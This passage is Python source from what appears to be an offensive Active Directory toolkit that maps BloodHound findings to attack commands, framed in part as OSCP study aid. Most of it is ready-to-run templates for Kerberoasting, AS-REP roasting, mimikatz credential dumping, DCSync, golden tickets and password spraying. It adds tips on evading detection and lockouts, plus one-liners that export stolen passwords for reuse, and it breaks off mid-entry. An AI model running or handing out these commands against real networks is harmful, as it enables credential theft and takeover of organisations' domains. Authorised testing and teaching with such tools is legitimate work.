    "ADCSESC10b": AccessTypeInfo(
        reward="Shadow credentials via ADCS for persistent access",
        phase="Privilege Escalation",
        priority=115,
        reason_template="{user} can add shadow credentials via {target}",
    ),
    "ADCSESC13": AccessTypeInfo(
        reward="OID group link for privilege escalation",
        phase="Privilege Escalation",
        priority=112,
        reason_template="{user} can exploit OID group link on {target}",
    ),
    "Enroll": AccessTypeInfo(
        reward="Request certificates for authentication",
        phase="Privilege Escalation",
        priority=105,
        reason_template="{user} can enroll in template {target}",
    ),
    "EnrollOnBehalfOf": AccessTypeInfo(
        reward="Request certificates impersonating other users",
        phase="Privilege Escalation",
        priority=103,
        reason_template="{user} can enroll certificates on behalf of others",
    ),
    "ManageCA": AccessTypeInfo(
        reward="CA management for certificate manipulation",
        phase="Privilege Escalation",
        priority=101,
        reason_template="{user} can manage CA {target}",
    ),
    "ManageCertificates": AccessTypeInfo(
        reward="Approve/deny certificate requests",
        phase="Privilege Escalation",
        priority=100,
        reason_template="{user} can approve certificate requests on {target}",
    ),
    # === LATERAL MOVEMENT (50-99) ===
    "AdminTo": AccessTypeInfo(
        reward="SYSTEM shell for credential dumping, persistence, and pivoting",
        phase="Lateral Movement",
        priority=99,
        reason_template="{user} has local admin rights on {target}",
    ),
    "ExecuteDCOM": AccessTypeInfo(
        reward="Remote code execution via DCOM for lateral movement",
        phase="Lateral Movement",
        priority=90,
        reason_template="{user} can execute DCOM on {target}",
    ),
    "CanPSRemote": AccessTypeInfo(
        reward="PowerShell remoting for stealthy command execution",
        phase="Lateral Movement",
        priority=85,
        reason_template="{user} has PSRemote/WinRM access to {target}",
    ),
    "HasSession": AccessTypeInfo(
        reward="Harvest cached credentials from logged-in privileged user",
        phase="Lateral Movement",
        priority=80,
        reason_template="Privileged session active on {target} - credential harvest",
    ),
    "AllowedToDelegate": AccessTypeInfo(
        reward="Impersonate any user to target service via S4U",
        phase="Lateral Movement",
        priority=75,
        reason_template="{user} has constrained delegation to {target}",
    ),
    "AllowedToAct": AccessTypeInfo(
        reward="Impersonate users via RBCD for privileged access",
        phase="Lateral Movement",
        priority=73,
        reason_template="{user} can impersonate users to {target} via RBCD",
    ),
    "AddAllowedToAct": AccessTypeInfo(
        reward="Configure RBCD to enable user impersonation",
        phase="Lateral Movement",
        priority=71,
        reason_template="{user} can add RBCD principals to {target}",
    ),
    "WriteAccountRestrictions": AccessTypeInfo(
        reward="Modify RBCD settings for delegation abuse",
        phase="Lateral Movement",
        priority=70,
        reason_template="{user} can configure RBCD on {target}",
    ),
    "CanRDP": AccessTypeInfo(
        reward="Interactive desktop access for GUI tools and credential theft",
        phase="Lateral Movement",
        priority=65,
        reason_template="{user} has RDP access to {target}",
    ),
    "CoerceToTGT": AccessTypeInfo(
        reward="Capture TGT for pass-the-ticket attacks",
        phase="Lateral Movement",
        priority=60,
        reason_template="{user} can coerce {target} auth to capture TGT",
    ),
    "HasSIDHistory": AccessTypeInfo(
        reward="Inherited permissions from historical SID membership",
        phase="Lateral Movement",
        priority=55,
        reason_template="{user} has SID history granting access to {target}",
    ),
    "TrustedBy": AccessTypeInfo(
        reward="Cross-domain access via trust relationship",
        phase="Lateral Movement",
        priority=50,
        reason_template="{target} trusts {user}'s domain",
    ),
    # === QUICK WINS (0-49) ===
    None: AccessTypeInfo(
        reward="Potential attack vector identified",
        phase="Quick Wins",
        priority=10,
        reason_template="",
    ),
}


# =============================================================================
# Backward-compatible dictionary views (generated from ACCESS_TYPE_CATALOG)
# =============================================================================

ACCESS_TYPE_REWARDS: Dict[Optional[str], str] = {
    k: v.reward for k, v in ACCESS_TYPE_CATALOG.items()
}

ACCESS_TYPE_PHASES: Dict[Optional[str], str] = {
    k: v.phase for k, v in ACCESS_TYPE_CATALOG.items()
}

ACCESS_TYPE_PRIORITY: Dict[Optional[str], int] = {
    k: v.priority for k, v in ACCESS_TYPE_CATALOG.items()
}

ACCESS_TYPE_REASONS: Dict[Optional[str], str] = {
    k: v.reason_template for k, v in ACCESS_TYPE_CATALOG.items()
}


def get_reason(
    access_type: Optional[str],
    user: str,
    target: str,
    context: str = ""
) -> str:
    """
    Generate human-readable reason for command suggestion.

    Args:
        access_type: BloodHound edge type (AdminTo, CanRDP, etc.)
        user: User principal with access
        target: Target computer or user
        context: Additional context from query mapping

    Returns:
        Human-readable reason string
    """
    # Try access_type template first
    template = ACCESS_TYPE_REASONS.get(access_type, "")

    if template:
        # Format with user/target, handling missing values
        user_short = extract_username(user) if user else "User"
        target_short = target.split(".")[0] if target else "target"
        return template.format(user=user_short, target=target_short)

    # Fall back to context if no access_type reason
    if context:
        return context

    # Generic fallback
    if access_type:
        return f"{access_type} relationship"

    return "BloodHound finding"


# =============================================================================
# AUTHENTICATED USER ATTACKS (any domain user can run)
# =============================================================================

# Templates for attacks that ANY authenticated domain user can run
# These don't require specific BloodHound edges - just valid domain creds
AUTHENTICATED_USER_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        # Credential Attacks (High Priority)
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        # BloodHound Collection
        "bloodhound": "bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>",
        # User/Group Enumeration
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users",
        "enum-groups": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'",
        # Share/Resource Enumeration
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers",
        # Policy/Config Enumeration
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol",
        "enum-gpos": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo",
        "enum-trusts": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts",
    },
    "ntlm-hash": {
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "bloodhound": "bloodhound-python -c all -u <USERNAME> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP>",
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --users",
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --computers",
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --pass-pol",
    },
    "kerberos-ticket": {
        "asrep-roast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP>",
        "kerberoast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP> -request",
        "bloodhound": "KRB5CCNAME=<CCACHE_FILE> bloodhound-python -c all -u <USERNAME> -k -d <DOMAIN> -dc <DC_IP>",
    },
}

# Attack metadata for display (organized by priority and category)
AUTHENTICATED_ATTACKS: List[Dict[str, str]] = [
    # === CREDENTIAL ATTACKS (High Priority) ===
    {
        "id": "asrep-roast",
        "name": "AS-REP Roasting",
        "category": "Credential Attacks",
        "objective": "Find users with DONT_REQUIRE_PREAUTH, get crackable hash",
        "rewards": "Credentials of AS-REP roastable users",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    {
        "id": "kerberoast",
        "name": "Kerberoasting",
        "category": "Credential Attacks",
        "objective": "Get TGS tickets for service accounts, crack offline",
        "rewards": "Service account credentials (often privileged)",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === BLOODHOUND (Recommended) ===
    {
        "id": "bloodhound",
        "name": "BloodHound Collection",
        "category": "Graph Collection",
        "objective": "Collect domain data for attack path analysis",
        "rewards": "Complete attack path visualization, missed edges",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === USER/GROUP ENUMERATION ===
    {
        "id": "enum-users",
        "name": "Domain User Enumeration",
        "category": "User Enumeration",
        "objective": "Enumerate all domain users for targeting",
        "rewards": "User list for password spraying, pattern analysis",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-groups",
        "name": "Domain Admins Members",
        "category": "User Enumeration",
        "objective": "Identify Domain Admin group members",
        "rewards": "High-value targets for credential attacks",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === RESOURCE ENUMERATION ===
    {
        "id": "enum-shares",
        "name": "Share Enumeration",
        "category": "Resource Enumeration",
        "objective": "Enumerate accessible SMB shares",
        "rewards": "Sensitive files, credentials, configuration data",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-computers",
        "name": "Computer Enumeration",
        "category": "Resource Enumeration",
        "objective": "List domain computers for lateral movement targets",
        "rewards": "Target list for lateral movement, version info",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === POLICY ENUMERATION ===
    {
        "id": "enum-passpol",
        "name": "Password Policy",
        "category": "Policy Enumeration",
        "objective": "Get password policy for spray planning",
        "rewards": "Lockout threshold, complexity, spray parameters",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-trusts",
        "name": "Domain Trust Enumeration",
        "category": "Policy Enumeration",
        "objective": "Discover domain trusts for cross-domain attacks",
        "rewards": "Trust relationships, potential lateral paths",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
    {
        "id": "enum-gpos",
        "name": "GPO Enumeration",
        "category": "Policy Enumeration",
        "objective": "Enumerate Group Policy Objects",
        "rewards": "GPO misconfigs, deployed software, privilege settings",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
]


def get_authenticated_attack_template(cred_type: str, attack_id: str) -> Optional[str]:
    """
    Get command template for an authenticated user attack.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket
        attack_id: Attack ID from AUTHENTICATED_ATTACKS

    Returns:
        Command template string or None if not available
    """
    return AUTHENTICATED_USER_TEMPLATES.get(cred_type, {}).get(attack_id)


def get_authenticated_attacks(priority: Optional[str] = None) -> List[Dict[str, str]]:
    """
    Get list of authenticated user attack metadata.

    Args:
        priority: Filter by priority (high, medium, low) or None for all

    Returns:
        List of attack metadata dicts
    """
    if priority is None:
        return AUTHENTICATED_ATTACKS
    return [a for a in AUTHENTICATED_ATTACKS if a.get("priority") == priority]


# =============================================================================
# POST-EXPLOITATION COMMANDS (after landing with local admin)
# =============================================================================

# Credential harvest commands organized by privilege level
# Shown after --pwn when user has local-admin access
POST_EXPLOITATION_COMMANDS: Dict[str, Dict[str, List[tuple]]] = {
    "local-admin": {
        "immediate": [
            ("mimikatz-privilege-debug", "Verify admin rights", "privilege::debug"),
            ("mimikatz-token-elevate", "Elevate to SYSTEM token", "token::elevate"),
        ],
        "credential_harvest": [
            ("mimikatz-sekurlsa-logonpasswords", "1. Active sessions - PRIORITY!", "sekurlsa::logonpasswords", "high"),
            ("mimikatz-sekurlsa-tickets-export", "2. Kerberos tickets", "sekurlsa::tickets /export", "high"),
            ("mimikatz-lsadump-sam", "3. Local account hashes", "lsadump::sam", "medium"),
            ("mimikatz-lsadump-secrets", "4. Service account passwords", "lsadump::secrets", "medium"),
            ("mimikatz-lsadump-cache", "5. Cached domain credentials", "lsadump::cache", "low"),
        ],
        "with_sessions": [
            ("mimikatz-sekurlsa-logonpasswords", "HIGH PRIORITY - DA sessions detected!", "sekurlsa::logonpasswords"),
            ("mimikatz-sekurlsa-tickets-export", "Export DA TGT for Pass-the-Ticket", "sekurlsa::tickets /export"),
        ],
        "with_harvested_hash": [
            ("mimikatz-overpass-the-hash", "Convert NTLM to Kerberos ticket", "sekurlsa::pth"),
            ("ad-silver-ticket-mimikatz-create", "Forge service ticket", "kerberos::golden /service"),
        ],
    },
    "domain-admin": {
        "remote_preferred": [
            ("ad-dcsync-impacket-secretsdump-user", "Remote DCSync (safer)", "secretsdump.py"),
            ("mimikatz-dcsync-all", "DCSync all accounts", "lsadump::dcsync /all"),
        ],
        "persistence": [
            ("ad-golden-ticket-mimikatz-create", "Golden Ticket for persistence", "kerberos::golden"),
        ],
        "on_dc": [
            ("ad-golden-ticket-lsa-dump-krbtgt", "Full NTDS extraction (on DC only)", "lsadump::lsa /patch"),
        ],
    },
    "user-level": {
        "limited": [
            ("mimikatz-kerberos-list", "View own Kerberos tickets", "kerberos::list"),
        ],
        "privesc_check": [
            ("winpeas", "Check for local privilege escalation", "winPEAS.exe"),
        ],
    },
}

# Educational tips for credential harvesting - what to look for and next steps
HARVEST_TIPS: Dict[str, Dict[str, List[str]]] = {
    "sekurlsa::logonpasswords": {
        "what_to_look_for": [
            "NTLM hash (32 hex chars) - usable for Pass-the-Hash",
            "Cleartext password - if wdigest enabled (older systems)",
            "Domain\\Username pairs - identify high-value accounts",
            "Multiple entries = multiple logged-in users (jackpot!)",
        ],
        "next_steps": [
            "Found DA hash? -> DCSync immediately: secretsdump.py",
            "Found service account? -> Check SPNs for Silver Ticket",
            "Found local admin? -> Spray hash: crackmapexec smb <targets> -H <hash>",
            "Cleartext password? -> Try password reuse on other accounts",
        ],
    },
    "sekurlsa::tickets": {
        "what_to_look_for": [
            "krbtgt tickets (TGT) - most valuable, reusable",
            "Service tickets (TGS) - limited to specific service",
            "Ticket expiration time - ensure not expired",
            "Encryption type - RC4 vs AES (AES = modern, stealthier)",
        ],
        "next_steps": [
            "Export TGT: sekurlsa::tickets /export",
            "Inject on attacker box: kerberos::ptt <ticket.kirbi>",
            "Use for lateral movement without knowing password",
            "DA TGT = domain-wide access via Kerberos auth",
        ],
    },
    "lsadump::sam": {
        "what_to_look_for": [
            "Local Administrator hash - often reused across machines!",
            "RID 500 = built-in Administrator (even if renamed)",
            "Other local accounts - may have weak passwords",
            "Compare hashes across machines for reuse",
        ],
        "next_steps": [
            "Crack: hashcat -m 1000 hash.txt rockyou.txt",
            "Spray: crackmapexec smb <targets> -H <hash> --local-auth",
            "Same hash on multiple machines = password reuse = pivot!",
            "Add to credential database for future spray attacks",
        ],
    },
    "lsadump::secrets": {
        "what_to_look_for": [
            "Service account passwords (often in cleartext!)",
            "DPAPI master keys - decrypt saved credentials",
            "Machine account password - rarely useful but document",
            "Scheduled task credentials - may be domain accounts",
        ],
        "next_steps": [
            "Service account found? -> Check if DA or high-privilege",
            "Use for lateral movement if service runs on other boxes",
            "Check SPNs: setspn -L <service_account>",
            "May enable Kerberoasting bypass (already have password)",
        ],
    },
    "lsadump::cache": {
        "what_to_look_for": [
            "DCC2 hashes - cached domain credentials",
            "Format: $DCC2$<iterations>$<username>$<hash>",
            "User accounts that logged in while DC unreachable",
            "May contain DA creds if DA logged in offline",
        ],
        "next_steps": [
            "Crack: hashcat -m 2100 dcc2.txt rockyou.txt",
            "DCC2 is SLOW to crack (~10x slower than NTLM)",
            "Prioritize high-value accounts (admin, service)",
            "Use rules: -r best64.rule for efficiency",
        ],
    },
    "overpass_the_hash": {
        "what_to_look_for": [
            "New cmd.exe window spawns with Kerberos context",
            "klist shows TGT for target user",
            "Can now use Kerberos auth (hostname required, not IP)",
        ],
        "next_steps": [
            "Access resources using hostname: dir \\\\DC01\\C$",
            "DO NOT use IP addresses (forces NTLM, bypasses ticket)",
            "Chain with other Kerberos attacks: Silver/Golden tickets",
        ],
    },
}

# Argument acquisition hints - how to obtain critical placeholders
ARG_ACQUISITION: Dict[str, Dict[str, Any]] = {
    "<SID>": {
        "description": "Domain Security Identifier (without user RID)",
        "quick_commands": [
            "whoami /user  # Remove last segment after final hyphen",
            "Get-ADDomain | Select DomainSID  # PowerShell",
            "lookupsid.py 'DOMAIN/user:pass'@DC_IP  # Impacket",
        ],
        "example": "S-1-5-21-1987370270-658905905-1781884369",
        "common_mistake": "Don't include user RID (the -1105 at the end)",
    },
    "<KRBTGT_HASH>": {
        "description": "NTLM hash of krbtgt account (32 hex chars)",
        "quick_commands": [
            "secretsdump.py -just-dc-user krbtgt 'DOMAIN/DA:pass'@DC_IP",
            "mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt",
        ],
        "requires": "Domain Admin or DCSync rights",
        "example": "1693c6cefafffc7af11ef34d1c788f47",
    },
    "<DOMAIN>": {
        "description": "Domain FQDN (not NetBIOS)",
        "quick_commands": [
            "echo %userdnsdomain%  # Windows CMD",
            "$env:USERDNSDOMAIN  # PowerShell",
            "Get-ADDomain | Select DNSRoot  # PowerShell AD",
        ],
        "example": "corp.com",
        "common_mistake": "Use FQDN (corp.com) not NetBIOS (CORP)",
    },
    "<DC_IP>": {
        "description": "Domain Controller IP address",
        "quick_commands": [
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN",
            "nltest /dclist:DOMAIN  # Windows",
            "echo %LOGONSERVER%  # Current DC",
        ],
        "example": "10.0.0.1",
    },
    "<SERVICE_HASH>": {
        "description": "NTLM hash of service account (for Silver Ticket)",
        "quick_commands": [
            "# Kerberoast then crack:",
            "GetUserSPNs.py -request 'DOMAIN/user:pass' -dc-ip DC_IP",
            "hashcat -m 13100 tgs.txt rockyou.txt",
            "# Or from LSASS if service logged in:",
            "sekurlsa::logonpasswords",
        ],
        "requires": "Any domain user (Kerberoast) or local admin (LSASS)",
    },
    "<TARGET_SPN>": {
        "description": "Service Principal Name (service/hostname)",
        "quick_commands": [
            "setspn -Q */<hostname>*  # Find SPNs on target",
            "setspn -L <service_account>  # List account's SPNs",
        ],
        "example": "cifs/files04.corp.com, http/web01.corp.com",
    },
}


# =============================================================================
# PASSWORD SPRAY TECHNIQUE METADATA
# =============================================================================

@dataclass
class SprayTechniqueInfo:
    """
    Password spray technique metadata for educational command suggestions.

    Each technique provides command templates and operational context
    for safe password spraying operations.
    """
    name: str
    description: str
    command_templates: Dict[str, str]   # template_name -> command template
    ports: List[int]                    # Required network ports
    requirements: List[str]             # Prerequisites
    noise_level: str                    # Detection risk: low, medium, high
    advantages: str                     # Why use this technique
    disadvantages: str                  # Limitations / risks
    oscp_relevance: str                 # OSCP exam relevance
    best_for: List[str]                 # Ideal scenarios


SPRAY_TECHNIQUES: Dict[str, SprayTechniqueInfo] = {
    "smb": SprayTechniqueInfo(
        name="SMB-Based Spray (crackmapexec/netexec)",
        description="Spray passwords using SMB authentication - validates creds AND checks admin access",
        command_templates={
            "single_password": "crackmapexec smb <DC_IP> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
            "password_list": "crackmapexec smb <DC_IP> -u <USER_FILE> -p <PASSWORD_FILE> -d <DOMAIN> --continue-on-success --no-bruteforce",
            "single_user": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>",
            "network_range": "crackmapexec smb <NETWORK_RANGE> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
        },
        ports=[445],
        requirements=["SMB port 445 open", "Network access to targets"],
        noise_level="high",
        advantages="Shows admin access (Pwn3d!), validates creds + checks admin in one step",
        disadvantages="Very noisy (Event logs 4625), triggers lockouts, detected by EDR",
        oscp_relevance="high",
        best_for=["Identifying admin access", "Quick validation", "Wide network spray"],
    ),
    "kerberos": SprayTechniqueInfo(
        name="Kerberos TGT-Based Spray (kerbrute)",
        description="Spray passwords using Kerberos pre-authentication - stealthiest method",
        command_templates={
            "single_password": "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USER_FILE> '<PASSWORD>'",
            "user_enum": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_FILE>",
            "bruteuser": "kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <PASSWORD_FILE> '<USERNAME>'",
        },
        ports=[88],
        requirements=["Kerberos port 88 reachable", "Valid user list"],
        noise_level="low",
        advantages="Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users",
        disadvantages="No admin check (just validates creds), requires valid userlist, Kerberos only",
        oscp_relevance="high",
        best_for=["Stealth operations", "Large user lists", "Initial access", "Strict lockout policies"],
    ),
    "ldap": SprayTechniqueInfo(
        name="LDAP/ADSI-Based Spray (PowerShell)",
        description="Spray passwords using LDAP bind - works on Windows without external tools",
        command_templates={
            "spray_ps1": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Verbose",
            "spray_ps1_admin": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Admin -Verbose",
            "manual_bind": "(New-Object DirectoryServices.DirectoryEntry('LDAP://<DC_IP>','<DOMAIN>\\<USERNAME>','<PASSWORD>')).distinguishedName",
        },
        ports=[389, 636],
        requirements=["LDAP port 389/636 open", "Windows environment (PowerShell)", "Domain-joined or runas"],
        noise_level="medium",
        advantages="Built into Windows - no external tools needed, uses native APIs, scriptable",
        disadvantages="Windows-only, slower than Kerberos, requires PowerShell access on target",
        oscp_relevance="medium",
        best_for=["Windows-only environments", "Living off the land", "When no tools can be transferred"],
    ),
}


# =============================================================================
# ALL-TARGETS CREDENTIAL VALIDATION (Multi-protocol loops)
# =============================================================================
# Templates for testing credentials across all discovered hosts
# Uses bash loops (<=20 IPs) or file-based input (>20 IPs)

ALL_TARGETS_PROTOCOLS: Dict[str, Dict[str, str]] = {
    "smb": {
        "port": "445",
        "description": "Shows Pwn3d! for local admin access",
        "loop_template": '''for IP in {ips}; do
    crackmapexec smb $IP -u {user_file} -p '{password}' -d {domain} --continue-on-success
done''',
        "file_template": "crackmapexec smb {targets_file} -u {user_file} -p '{password}' -d {domain} --continue-on-success",
    },
    "winrm": {
        "port": "5985",
        "description": "PS Remoting / Evil-WinRM targets",
        "loop_template": '''for IP in {ips}; do
    crackmapexec winrm $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec winrm {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
    "rdp": {
        "port": "3389",
        "description": "Remote Desktop access check",
        "loop_template": '''for IP in {ips}; do
    crackmapexec rdp $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec rdp {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
    "mssql": {
        "port": "1433",
        "description": "Database server access",
        "loop_template": '''for IP in {ips}; do
    crackmapexec mssql $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec mssql {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
}

# Threshold for switching from inline IPs to file-based input
ALL_TARGETS_IP_THRESHOLD = 20


# Spray scenarios for contextual recommendations
SPRAY_SCENARIOS: List[Dict[str, Any]] = [
    {
        "scenario": "Stealth required (avoid detection)",
        "recommendation": "kerberos",
        "reason": "Kerbrute doesn't generate Windows Event Logs for failed auth",
    },
    {
        "scenario": "Need to identify admin access",
        "recommendation": "smb",
        "reason": "CME shows (Pwn3d!) for admin access, validates + checks in one step",
    },
    {
        "scenario": "Large user list (1000+ users)",
        "recommendation": "kerberos",
        "reason": "Fastest option - only 2 UDP frames per attempt",
    },
    {
        "scenario": "Windows-only environment (no tool transfer)",
        "recommendation": "ldap",
        "reason": "Uses built-in PowerShell, no binary transfer needed",
    },
    {
        "scenario": "Strict lockout policy (threshold <= 3)",
        "recommendation": "kerberos",
        "reason": "Pre-auth check identifies invalid users without incrementing lockout counter",
    },
    {
        "scenario": "Need to spray entire subnet",
        "recommendation": "smb",
        "reason": "CME supports CIDR ranges, shows which hosts are accessible",
    },
]


# =============================================================================
# USER ENUMERATION COMMANDS (for generating user lists)
# =============================================================================

USER_ENUM_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
    "windows": {
        "local_users": {
            "cmd": "net user",
            "description": "List local users on current machine",
        },
        "domain_users": {
            "cmd": "net user /domain",
            "description": "List all domain users (requires domain access)",
        },
        "domain_users_to_file": {
            "cmd": "net user /domain > users.txt",
            "description": "Export domain users to file",
        },
        "powershell_ad": {
            "cmd": "Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > users.txt",
            "description": "PowerShell AD enumeration (requires RSAT)",
        },
        "ldap_query": {
            "cmd": "(New-Object DirectoryServices.DirectorySearcher('(&(objectClass=user)(objectCategory=person))')).FindAll() | ForEach-Object { $_.Properties['samaccountname'] } > users.txt",
            "description": "LDAP query without RSAT",
        },
        "net_group": {
            "cmd": "net group \"Domain Users\" /domain",
            "description": "List Domain Users group members",
        },
    },
    "linux": {
        "kerbrute_enum": {
            "cmd": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt",
            "description": "Enumerate valid users via Kerberos pre-auth",
        },
        "ldapsearch": {
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\\<USERNAME>' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt",
            "description": "LDAP enumeration with credentials",
        },
        "crackmapexec_users": {
            "cmd": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users | awk '{print $5}' | grep -v '\\[' > users.txt",
            "description": "CME user enumeration (authenticated)",
        },
        "bloodhound_export": {
            "cmd": "echo \"MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' > users.txt",
            "description": "Export users from BloodHound Neo4j (clean output)",
        },
        "rpcclient": {
            "cmd": "rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\\[.*?\\]' | tr -d '[]' | cut -d' ' -f1 > users.txt",
            "description": "RPC user enumeration",
        },
        "enum4linux": {
            "cmd": "enum4linux -U <DC_IP> | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt",
            "description": "enum4linux user enumeration (unauthenticated if allowed)",
        },
    },
}


# =============================================================================
# PASSWORD LIST GENERATION COMMANDS (for generating password lists)
# =============================================================================

PASSWORD_LIST_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
    "linux": {
        "bloodhound_passwords": {
            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' | sort -u > passwords.txt",
            "description": "Export pwned passwords from BloodHound Neo4j",
        },
        "bloodhound_user_pass": {
            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true AND 'password' IN u.pwned_cred_types WITH u, [i IN range(0, size(u.pwned_cred_types)-1) WHERE u.pwned_cred_types[i] = 'password' | u.pwned_cred_values[i]][0] AS pass WHERE pass IS NOT NULL RETURN u.samaccountname + ':' + pass\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' > user_pass.txt",
            "description": "Export user:password pairs from Neo4j",
        },
        "hashcat_potfile": {
            "cmd": "cat ~/.hashcat/hashcat.potfile | cut -d':' -f2 > passwords.txt",
            "description": "Extract cracked passwords from hashcat potfile",
        },
        "john_potfile": {
            "cmd": "cat ~/.john/john.pot | cut -d':' -f2 > passwords.txt",
            "description": "Extract cracked passwords from john potfile",
        },
        "cewl_wordlist": {
            "cmd": "cewl -d 2 -m 5 -w passwords.txt <TARGET_URL>",
            "description": "Generate wordlist from target website",
        },
        "mutation_rules": {
            "cmd": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule passwords.txt > mutated_passwords.txt",
            "description": "Apply mutation rules to existing password list",
        },
    },
    "windows": {
        "mimikatz_extract": {
            "cmd": "mimikatz.exe \"sekurlsa::logonpasswords\" exit | findstr /i \"Password :\" > passwords.txt",
            "description": "Extract passwords from mimikatz output",
        },
    },
}


# Password list generation scenario recommendations
PASSWORD_LIST_SCENARIOS: List[Dict[str, str]] = [
    {
        "scenario": "Have pwned users in BloodHound",
        "method": "bloodhound_passwords",
        "reason": "Direct extraction of captured credentials from Neo4j",
    },
    {
        "scenario": "Need user:password pairs for spray",
        "method": "bloodhound_user_pass",
        "reason": "Export in format ready for credential stuffing",
    },
    {
        "scenario": "After cracking NTLM/Kerberos hashes",
        "method": "hashcat_potfile",
        "reason": "Extract successfully cracked passwords",
    },
    {
        "scenario": "Web application target",
        "method": "cewl_wordlist",
        "reason": "Organization-specific words from website content",
    },
    {
        "scenario": "Need password variations",
        "method": "mutation_rules",
        "reason": "Expand list with common patterns (l33t, seasons, years)",
    },
]


# =============================================================================
# SPRAY ONE-LINERS (complete chained attack workflows)
# =============================================================================

SPRAY_ONELINERS: List[Dict[str, str]] = [
    {
        "name": "Full Neo4j Spray (Stealth)",
        "description": "Export non-pwned users + passwords from Neo4j, spray with kerbrute",
